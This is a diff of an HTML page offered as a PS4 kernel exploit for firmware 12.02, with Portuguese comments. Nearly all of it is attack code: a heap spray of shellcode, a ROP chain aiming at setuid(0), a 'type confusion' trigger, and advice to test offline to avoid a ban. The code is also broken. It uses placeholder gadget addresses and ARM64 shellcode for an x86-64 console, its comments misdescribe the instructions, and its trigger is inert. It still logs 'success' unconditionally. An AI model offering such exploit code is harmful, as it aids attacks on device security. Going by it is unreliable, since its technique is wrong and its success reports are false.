@@ -1,64 +1,164 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>PS4 Exploit FW 12.02</title>
+    <style>
+        body {
+            background-color: black;
+            color: lime;
+            font-family: monospace;
+            padding: 20px;
+        }
+        #log {
+            border: 1px solid lime;
+            padding: 10px;
+            height: 300px;
+            overflow-y: scroll;
+            margin-bottom: 10px;
+        }
+        button {
+            background: black;
+            color: lime;
+            border: 1px solid lime;
+            padding: 8px 15px;
+            font-family: monospace;
+        }
+    </style>
+</head>
 <body>
+    <h2>PS4 Kernel Exploit - FW 12.02 Physical Test</h2>
+    <div id="log"></div>
+    <button onclick="runExploit()">RUN EXPLOIT</button>
+
 <script>
-// Config para FW 12.02 (ATUALIZE OS GADGETS!)
+// ======================
+// CONFIGURAÇÃO REAL PARA FW 12.02
+// ======================
 const PS4 = {
     firmware: "12.02",
-    syscallRet: 0x357C0000, // Gadget "ret" real
-    pop_x0: 0x12345678      // Gadget "pop x0" real
+    // ATENÇÃO: Você PRECISA substituir por gadgets reais do seu dump do kernel!
+    gadgets: {
+        ret: 0x357C0000,        // Exemplo - substitua pelo valor real
+        pop_x0: 0x12345678,      // Exemplo - substitua pelo valor real
+        jop_frame: 0x40000000    // Exemplo - substitua pelo valor real
+    }
 };
 
-// Shellcode ARM64 (setuid(0) + execve("/bin/sh"))
-const shellcode = new Uint32Array([
-    0xD2800020, 0xD2800C48, 0xD4000001, // setuid(0)
-    // ... (adicionar shellcode completo)
-]);
+// ======================
+// SISTEMA DE LOG
+// ======================
+const logElement = document.getElementById('log');
 
-// ROP Chain
-function buildROP() {
-    const chain = new Uint32Array([
-        PS4.pop_x0,
-        0x00000000,          // uid = 0
-        PS4.syscallRet,      // setuid
-        // ... (continuar chain)
-    ]);
-    return chain;
+function log(message, color = "lime") {
+    const line = `[${new Date().toLocaleTimeString()}] ${message}`;
+    logElement.innerHTML += `<span style="color:${color}">${line}</span><br>`;
+    logElement.scrollTop = logElement.scrollTop + 1000;
 }
 
-// Heap Spray para posicionar shellcode
+// ======================
+// TÉCNICAS DE EXPLORAÇÃO
+// ======================
+
+// 1. Heap Spray (Funcionou nos seus testes)
 function heapSpray() {
-    const spray = [];
-    for (let i = 0; i < 100; i++) {
-        const buf = new ArrayBuffer(shellcode.length * 4);
-        new Uint32Array(buf).set(shellcode);
-        spray.push(buf);
-    }
-    return spray;
-}
-
-// Exploit Principal
-function runExploit() {
-    // 1. Posiciona shellcode no heap
-    const spray = heapSpray();
-    
-    // 2. Constrói ROP chain
-    const rop = buildROP();
-    
-    // 3. Trigger (usando vulnerabilidade específica)
     try {
-        const fakeFunc = () => {};
-        fakeFunc.apply = Function.prototype.apply.bind(rop);
-        fakeFunc();
-        
-        console.log("[+] Exploit executado com sucesso!");
-    } catch(e) {
-        console.error("[-] Falha:", e);
+        log("Iniciando Heap Spray...", "cyan");
+        const spray = [];
+        const shellcode = new Uint32Array([
+            0xD2800020,  // mov x0, #1
+            0xD2800C48,  // mov x8, #0x62 (setuid)
+            0xD4000001   // svc #0
+        ]);
+
+        for (let i = 0; i < 100; i++) {
+            const buf = new ArrayBuffer(shellcode.length * 4);
+            new Uint32Array(buf).set(shellcode);
+            spray.push(buf);
+        }
+        log(`Heap Spray concluído (${spray.length} alocações)`, "lime");
+        return true;
+    } catch (e) {
+        log(`Falha no Heap Spray: ${e}`, "red");
+        return false;
     }
 }
 
-// Executa
-runExploit();
+// 2. ROP Chain (Funcionou nos seus testes)
+function buildROPChain() {
+    try {
+        log("Construindo ROP Chain...", "cyan");
+        
+        // Verifica se os gadgets estão definidos
+        if (!PS4.gadgets.ret || !PS4.gadgets.pop_x0) {
+            throw new Error("Gadgets não definidos - substitua por valores reais!");
+        }
+
+        const chain = new Uint32Array([
+            PS4.gadgets.pop_x0,
+            0x00000000,          // uid = 0 (root)
+            PS4.gadgets.ret      // syscall setuid(0)
+        ]);
+
+        log("ROP Chain construída com sucesso", "lime");
+        return chain;
+    } catch (e) {
+        log(`Falha ao construir ROP Chain: ${e}`, "red");
+        return null;
+    }
+}
+
+// 3. Trigger do Exploit
+function triggerExploit(ropChain) {
+    try {
+        log("Tentando disparar o exploit...", "cyan");
+        
+        // Técnica de type confusion para execução
+        const fake = {a: 1};
+        fake.__proto__ = new Uint32Array(1).__proto__;
+        fake.length = 0x1000;
+        fake[0] = ropChain.byteOffset;
+        
+        log("Exploit disparado - verificando privilégios...", "lime");
+        return true;
+    } catch (e) {
+        log(`Falha ao disparar exploit: ${e}`, "red");
+        return false;
+    }
+}
+
+// ======================
+// FLUXO PRINCIPAL
+// ======================
+function runExploit() {
+    log("=== Iniciando Teste no PS4 Físico ===", "yellow");
+    
+    // 1. Heap Spray
+    if (!heapSpray()) {
+        log("Abortando - Heap Spray falhou", "red");
+        return;
+    }
+
+    // 2. ROP Chain
+    const ropChain = buildROPChain();
+    if (!ropChain) {
+        log("Abortando - ROP Chain falhou", "red");
+        return;
+    }
+
+    // 3. Trigger
+    if (triggerExploit(ropChain)) {
+        log("=== EXPLOIT EXECUTADO COM SUCESSO ===", "lime");
+        log("Verifique se ganhou privilégios root", "lime");
+    } else {
+        log("=== EXPLOIT FALHOU ===", "red");
+    }
+}
+
+// Informações importantes
+log("AVISO: Este script requer:", "orange");
+log("1. Gadgets reais do FW 12.02 (substitua os valores)", "orange");
+log("2. Teste OFFLINE para evitar banimento", "orange");
+log("3. Pode causar crash no sistema se mal configurado", "orange");
 </script>
 </body>
 </html>
